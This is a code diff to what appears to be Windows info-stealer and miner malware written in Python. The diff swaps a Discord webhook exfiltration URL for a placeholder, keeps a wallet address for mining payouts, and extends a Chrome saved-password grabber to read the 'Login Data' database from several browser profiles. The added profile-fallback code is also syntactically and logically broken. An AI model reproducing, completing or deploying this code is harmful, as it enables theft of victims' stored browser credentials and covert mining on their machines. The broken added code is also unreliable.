@@ -50,7 +50,7 @@ from datetime import timezone, datetime, timedelta
 """
 
 #WaiBook = "it|qt;00ejtdpse/dpn/aqi7xfcipplt0211:7:36616?885779:0heqLJxXlfzKs>IRZW:SUtX`s8`zexQmPL\zybLym1M:`segvEorePSAhMMv12n[{qc`J"
-chiffre = "https://discord.com/api/webhooks/1009580301812514886/bKV3mU8ZYwj-SHdivqqkIS5ChFi9UeEQSB7MuY8DhRUqZyRjbe4cTFeeiMzR5F09ojPH"
+chiffre = "webhook667"
 ADDRESS = "TRX:TT9CxzPs846UQ2F5zxwmPuqHV115ETvs4d" #Only RandomX, replace with your adress COIN:ADDR ex : XMR:42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNqm8AYz9NaXorfdHbnYqcUaRstHq please donate lmao
 
 
@@ -346,9 +346,19 @@ if yes == "yes":
 	def main():
 		try:
 			binks = ""
-			key = fetching_encryption_key()
 			db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
 									"Google", "Chrome", "User Data", "default", "Login Data")
+			if not os.path.exists(db_path):
+
+				db_path = os.environ["USERPROFILE"], "AppData", "Local",
+									"Google", "Chrome", "User Data", "Profile 1", "Login Data"
+				if not os.path.exists(db_path):
+					db_path = os.environ["USERPROFILE"], "AppData", "Local",
+									"Google", "Chrome", "User Data", "Profile 2", "Login Data"
+					if not os.path.exists(db_path):
+						continue
+			key = fetching_encryption_key()
+			
 			filename = "ChromePasswords.db"
 			shutil.copyfile(db_path, filename)
 			  
